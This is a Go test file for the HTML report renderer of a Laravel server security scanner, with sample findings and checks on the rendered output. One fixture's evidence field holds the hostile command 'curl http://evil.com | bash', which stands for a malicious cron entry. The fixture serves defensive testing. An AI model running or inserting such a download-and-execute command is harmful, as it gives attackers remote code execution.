package html_test

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/nagi1/larainspect/internal/model"
	htmlreport "github.com/nagi1/larainspect/internal/report/html"
)

func testReport() model.Report {
	report, _ := model.BuildReport(
		model.Host{Hostname: "prod-web-01", OS: "linux", Arch: "amd64"},
		time.Date(2025, 6, 15, 10, 30, 0, 0, time.UTC),
		3*time.Second,
		[]model.Finding{
			{
				ID:          "source.config.debug_true.var.www.app",
				CheckID:     "source.config",
				Class:       model.FindingClassDirect,
				Severity:    model.SeverityCritical,
				Confidence:  model.ConfidenceConfirmed,
				Title:       "APP_DEBUG is enabled in production",
				Why:         "Debug mode leaks stack traces.",
				Remediation: "Set APP_DEBUG=false",
				Evidence:    []model.Evidence{{Label: "env", Detail: "APP_DEBUG=true"}},
				Affected:    []model.Target{{Type: "file", Path: "/var/www/app/.env"}},
			},
			{
				ID:          "source.config.http_only_false.var.www.app",
				CheckID:     "source.config",
				Class:       model.FindingClassHeuristic,
				Severity:    model.SeverityMedium,
				Confidence:  model.ConfidenceProbable,
				Title:       "Session cookies lack Secure flag",
				Why:         "Cookies sent over HTTP.",
				Remediation: "Set SESSION_SECURE_COOKIE=true",
				Evidence:    []model.Evidence{{Label: "config", Detail: "secure=false"}},
			},
			{
				ID:          "nginx.boundaries.upload_execution.etc.nginx.sites-enabled.app.conf",
				CheckID:     "nginx.boundaries",
				Class:       model.FindingClassCompromiseIndicator,
				Severity:    model.SeverityHigh,
				Confidence:  model.ConfidencePossible,
				Title:       "Suspicious cron entry found",
				Why:         "A cron job downloads and executes remote scripts.",
				Remediation: "Review and remove the suspicious cron entry",
				Evidence:    []model.Evidence{{Label: "cron", Detail: "curl http://evil.com | bash"}},
			},
		},
		[]model.Unknown{
			{
				ID:      "unknown-1",
				CheckID: "PHP_VERSION",
				Title:   "Could not determine PHP version",
				Reason:  "php binary not found",
				Error:   model.ErrorKindCommandMissing,
			},
		},
	)
	return report
}

func TestHTMLReporterFormat(t *testing.T) {
	r := htmlreport.NewReporter()
	if r.Format() != "html" {
		t.Fatalf("Format() = %q, want html", r.Format())
	}
}

func TestHTMLReporterRender(t *testing.T) {
	r := htmlreport.NewReporter()
	report := testReport()

	var buf bytes.Buffer
	if err := r.Render(&buf, report); err != nil {
		t.Fatalf("Render() error: %v", err)
	}

	output := buf.String()

	// Check it's valid HTML.
	if !strings.HasPrefix(output, "<!DOCTYPE html>") {
		t.Error("output should start with <!DOCTYPE html>")
	}
	if !strings.Contains(output, "</html>") {
		t.Error("output should contain closing </html>")
	}

	// Check branding.
	if !strings.Contains(output, "LARAINSPECT") {
		t.Error("sidebar logo should say LARAINSPECT")
	}
	if !strings.Contains(output, "Larainspect") {
		t.Error("footer should reference Larainspect")
	}

	// Check host info.
	if !strings.Contains(output, "prod-web-01") {
		t.Error("should contain the hostname")
	}

	// Check finding classes appear.
	if !strings.Contains(output, "Direct Findings") {
		t.Error("should contain Direct Findings section")
	}
	if !strings.Contains(output, "Heuristic Findings") {
		t.Error("should contain Heuristic Findings section")
	}
	if !strings.Contains(output, "Compromise Indicators") {
		t.Error("should contain Compromise Indicators section")
	}

	// Check unknowns section.
	if !strings.Contains(output, "Unknowns") {
		t.Error("should contain Unknowns section")
	}
	if !strings.Contains(output, "Could not determine PHP version") {
		t.Error("should contain unknown title")
	}

	// Check severity badges.
	if !strings.Contains(output, "critical") {
		t.Error("should contain critical severity")
	}

	// Check evidence rendering.
	if !strings.Contains(output, "APP_DEBUG=true") {
		t.Error("should contain evidence detail")
	}
	if !strings.Contains(output, "laravel.env-integrity-and-permissions") && !strings.Contains(output, "php.runtime-debug-and-diagnostic-exposure") {
		t.Error("should contain related controls")
	}
}

func TestHTMLReporterEmptyReport(t *testing.T) {
	r := htmlreport.NewReporter()
	report, _ := model.BuildReport(
		model.Host{Hostname: "test"},
		time.Now(),
		0,
		nil,
		nil,
	)

	var buf bytes.Buffer
	if err := r.Render(&buf, report); err != nil {
		t.Fatalf("Render() error: %v", err)
	}

	output := buf.String()
	if !strings.Contains(output, "None.") {
		t.Error("empty sections should say None.")
	}
}
